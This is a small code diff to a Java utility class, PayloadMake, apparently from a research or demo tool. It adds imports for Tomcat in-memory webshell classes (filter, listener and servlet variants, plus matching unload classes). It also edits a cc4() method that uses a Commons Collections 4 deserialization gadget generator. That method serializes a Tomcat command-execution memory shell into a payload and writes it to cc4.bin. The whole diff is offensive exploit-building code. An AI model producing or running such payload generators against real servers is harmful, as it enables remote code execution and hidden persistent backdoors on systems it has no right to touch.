@@ -1,7 +1,13 @@
 package com.demo.utils;
 
 import com.demo.memshell.all.TomcatExecThreadListener;
+import com.demo.memshell.exec.TomcatFilterThreadMS;
+import com.demo.memshell.exec.TomcatListenerThreadMS;
 import com.demo.memshell.exec.TomcatListenerWebAppMS;
+import com.demo.memshell.exec.TomcatServletThreadMS;
+import com.demo.memshell.unload.UnloadTomcatFilterThreadMS;
+import com.demo.memshell.unload.UnloadTomcatListenerThreadMS;
+import com.demo.memshell.unload.UnloadTomcatServletThreadMS;
 import org.ppp.tools.ser.CC4Generator;
 
 import java.util.ArrayList;
@@ -20,10 +26,11 @@ public class PayloadMake {
     }
 
     public static void cc4() throws Exception {
+        Class msmClass = TomcatExecThreadListener.class;
         CC4Generator cc4Generator = new CC4Generator();
-        String payload = cc4Generator.make(TomcatExecThreadListener.class);
+        String payload = cc4Generator.make(msmClass);
         System.out.println(payload.length());
-        cc4Generator.makeFile(TomcatExecThreadListener.class, "cc4.bin");
+        cc4Generator.makeFile(msmClass, "cc4.bin");
     }
 
     public void searchTomcat() {
